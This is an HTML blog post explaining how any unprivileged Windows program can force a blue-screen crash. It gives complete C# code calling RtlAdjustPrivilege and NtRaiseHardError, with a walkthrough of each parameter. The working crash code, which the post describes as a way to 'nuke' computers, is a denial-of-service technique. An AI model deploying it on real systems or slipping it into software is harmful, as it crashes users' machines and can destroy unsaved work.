<!DOCTYPE html>
<html>

<head>
    <title>Raising bugchecks from userspace in NT.</title>
    <script src="BsodPost.js"></script>
    <script src="/Libraries/Prism/prism.js"></script>

    <link rel="stylesheet" href="BsodPost.css">
    <link rel="icon" href="/Resources/favicon.png">
    <link href="/Libraries/Prism/prism.css" rel="stylesheet" />

    <meta name="og:title" content="Raising bugchecks from userspace in NT.">
    <meta name="og:url" content="https://aestheticalz.github.io/">
    <meta name="og:description" content="Why did Microsoft decide to allow ANY userspace program without admin rights to bugcheck the system with 2 function calls?">
    <meta name="og:image" content="https://aestheticalz.github.io/Resources/bannercropped.png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="theme-color" content="#008080">
    <link type="application/json+oembed"
        href="https://gist.githubusercontent.com/AestheticalZ/94ea87ce4245a66d522f0e8d0011bbc0/raw/c128e4c4b250039c3de6f5a02317720ba162b95a/aestheticalshideoutfirstpost.json" />
</head>

<body>
    <noscript>
        <style>html {display: none;}</style>
        <meta http-equiv="refresh" content="0.0;url=/nojavascript.html">
    </noscript>

    <div class="window centeredDiv" style="width: 75%;">
        <div class="title-bar">
            <div class="title-bar-text" style="user-select: none;">Aesthetical's Hideout : Raising bugchecks from userspace in NT.</div>
            <div class="title-bar-controls">
                <button aria-label="Close"
                    onclick="window.location='/index.html#tabPosts'"></button>
            </div>
        </div>
        <div class="window-body">
            <div style="overflow-y: scroll; height: 50vh; margin-bottom: 5px;">
                <img src="/Resources/flag.gif" style="vertical-align: middle; padding-right: 10px;">
                <h4 style="display: inline; vertical-align: middle;">Raising bugchecks from userspace in NT.</h4>

                <p>
                    If you are reading this post right here and right now, congratulations! You are interested in how to nuke
                    computers from a simple userspace program.
                    <br>
                    In this post I will show some example code, and attempt to shine a light into this mysterious function.
                    <br><br>
                    So, let's get into it!
                </p>

                <h4 style="margin-bottom: 15px;">Analyzing the code</h4>

                <!--START CODE BLOCK-->
                <div class="codeDiv">
                    <pre class="fullWidth"><code class="language-cs">using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
                    
class Program
{
    [DllImport("ntdll.dll")]
    private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege,
                                                    out bool PreviousValue);
    [DllImport("ntdll.dll")]
    private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask,
                                                IntPtr Parameters,
                                                uint ValidResponseOption, out uint Response);
                    
    static void Main(string[] args)
    {
        RtlAdjustPrivilege(19, true, false, out bool idk);
        NtRaiseHardError(0xc0000420, 0, 0, IntPtr.Zero, 6, out uint output);
    }
}</code></pre>
                </div>
                <!--END CODE BLOCK-->

                <p>
                    <br>
                    You may be wondering, <i>Is it really that easy to nuke a computer?</i>
                    <br>
                    The answer is <b>yes</b>! You may also be wondering, <i>Why would Microsoft make it so easy?</i>
                    <br>
                    The answer for that is, <b>nobody knows</b>!
                    <br><br>
                    Oh, wait! I can't believe I forgot to comment what each part of the code does...
                    <br><br>
                </p>

                <!--START CODE BLOCK-->
                <div class="codeDiv">
                    <pre class="fullWidth"><code class="language-cs">[DllImport("ntdll.dll")]
private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege,
                                                    out bool PreviousValue);
[DllImport("ntdll.dll")]
private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask,
                                            IntPtr Parameters,
                                            uint ValidResponseOption, out uint Response);</code></pre>
                </div>
                <!--END CODE BLOCK-->

                <p>
                    <br>
                    In a nutshell, these import the "RtlAdjustPrivilege" and "NtRaiseHardError" functions from
                    the ntdll.dll DLL. These are of course needed to make the system throw a bugcheck.
                    <br><br>
                </p>

                <!--START CODE BLOCK-->
                <div class="codeDiv">
                    <pre class="fullWidth"><code class="language-cs">RtlAdjustPrivilege(19, true, false, out bool idk);</code></pre>
                </div>
                <!--END CODE BLOCK-->

                <p>
                    <br>
                    Let's split this into parts:
                    <ul>
                        <li><b>First parameter (Privilege):</b> the privilege to enable, in this case 19, which is <b>SeShutdownPrivilege</b>.
                            This is required, otherwise NtRaiseHardError will not throw a bugcheck.</li>
                        <li><b>Second parameter (EnablePrivilege):</b> enables the privilege if <b>true</b>, disables it if <b>false</b>.</li>
                        <li><b>Third parameter (IsThreadPrivilege):</b> enables the privilege for the current thread if <b>true</b>, otherwise, the whole process.</li>
                        <li><b>Fourth parameter (PreviousValue):</b> outputs a boolean that tells us if the privilege was enabled before or not.</li>
                    </ul>
                    <br>
                </p>

                <!--START CODE BLOCK-->
                <div class="codeDiv">
                    <pre class="fullWidth"><code class="language-cs">NtRaiseHardError(0xc0000420, 0, 0, IntPtr.Zero, 6, out uint output);</code></pre>
                </div>
                <!--END CODE BLOCK-->

                <p>
                    <br>
                    Let's ALSO split this into parts:
                    <ul>
                        <li><b>First parameter (ErrorStatus):</b> the stop code to pass. <b>0xC0000420</b> means <b>STATUS_ASSERTION_FAILURE</b>.
                            I haven't tried ALL of the NTSTATUS codes, but it seems that this is the only one that works.</li>
                        <li><b>Second parameter (NumberOfParameters):</b> number of <b>optional</b> parameters in the "Parameters" parameter.
                            <b>0</b> since we don't pass any.</li>
                        <li><b>Third parameter (UnicodeStringParameterMask):</b> according to a ReactOS contributor, <i>it serves to tell the function which element(s)
                            in the given parameters array are pointers to unicode strings</i>.</li>
                        <li><b>Fourth parameter (Parameters):</b> an array of DWORDs that will be shown when displaying the stop code.
                            <b>IntPtr.Zero</b> since we don't need any.</li>
                        <li><b>Fifth parameter (ValidResponseOption):</b> the system response to the hard error. 6 is <b>OptionShutdownSystem</b>.
                            It must be 6, otherwise it will not work.</li>
                        <li><b>Sixth parameter (Response):</b> pointer to HARDERROR_RESPONSE struct. Not needed here since bugchecks do not set a response.</li>
                    </ul>
                </p>

                <h4 style="margin-bottom: 15px;">Going deeper</h4>
                <p>
                    So, why is this exposed to every user-space program? We may never know.
                    <br>
                    Who knows? Maybe its a poor decision for backwards compatibility for some old, weird, business program. What is true is that
                    ReactOS supposedly does not suffer from this.
                    <br><br>
                    I have tried <a href="https://github.com/AestheticalZ/BSODMachine">BSODMachine</a> under Windows XP, Vista, 7, 8.1, 10 and 11. I 
                    have yet to try 2000 and ReactOS.
                </p>
            </div>
            <fieldset>
                Any comments or opinions? Head over 
                <a target="_blank" href="https://github.com/AestheticalZ/aestheticalz.github.io/discussions/categories/userspace-bugchecks-comments">here</a> 
                and create a discussion!
            </fieldset>
            <div class="field-row" style="justify-content: flex-start;">
                <a href="https://theoldnet.com/get?year=1996&scripts=false&decode=false&url=http://netscape.com"
                    class="flexSizeOverride">
                    <img border="0" src="/Resources/NetGifs/netnow3.gif" style="width: 100%;">
                </a>
                <a href="https://theoldnet.com/get?year=1996&scripts=false&decode=false&url=http://microsoft.com//ie/ie.htm"
                    class="flexSizeOverride">
                    <img border="0" src="/Resources/NetGifs/iexplorer.gif" style="width: 100%;">
                </a>
                <a href="https://theoldnet.com/get?year=1996&scripts=false&decode=false&url=http://frontpageworld.com/"
                    class="flexSizeOverride">
                    <img border="0" src="/Resources/NetGifs/frontpg.gif" style="width: 100%;">
                </a>
                <a href="https://theoldnet.com/get?year=1996&scripts=false&decode=false&url=http://linkexchange.com"
                    class="flexSizeOverride">
                    <img border="0" src="/Resources/NetGifs/linkexchange.gif" style="width: 100%;">
                </a>
                <div class="field-row" style="margin-left: auto; margin-bottom: auto;">
                    <a href="/rss.xml">
                        <img border="0" src="/Resources/SocialMedia/rss.png" title="Subscribe to the RSS feed!">
                    </a>
                    <a href="https://discords.com/bio/p/analogfeelings" title="Add me on Discord!">
                        <img border="0" src="/Resources/SocialMedia/discord.png" width="16" height="16">
                    </a>
                    <a href="https://twitter.com/z_aesthetical" title="Follow me on Twitter!">
                        <img border="0" src="/Resources/SocialMedia/twitter.webp" width="16" height="16">
                    </a>
                    <a href="https://www.youtube.com/channel/UC0DyFqMDghAeL9trXMcItig" title="Subscribe to my YouTube channel!">
                        <img border="0" src="/Resources/SocialMedia/youtube.png" width="16" height="16">
                    </a>
                </div>
            </div>
            <section class="field-row" style="justify-content: flex-end">
                <button onclick="window.location='/index.html#tabPosts'">Go Back</button>
                <button onclick="ChangeTheme()">Change Theme</button>
            </section>
        </div>
        <div class="status-bar">
            <p class="status-bar-field">2022 <b>AestheticalZ</b>
                , released under <b>GPL v3.0</b></p>
            <p class="status-bar-field">Using a fork of <a href="https://github.com/AestheticalZ/XP.css">XP.css</a>,
            originally by <b>botoxparty</b>.</p>
            <p class="status-bar-field">Star me on <a
                    href="https://github.com/AestheticalZ/aestheticalz.github.io">GitHub</a>!
            </p>
            <p class="status-bar-field">Created: <b>2021-11-30 08:31PM</b></p>
            <p class="status-bar-field">Edited: <b>2022-01-01 05:50AM</b></p>
        </div>
    </div>
</body>

</html>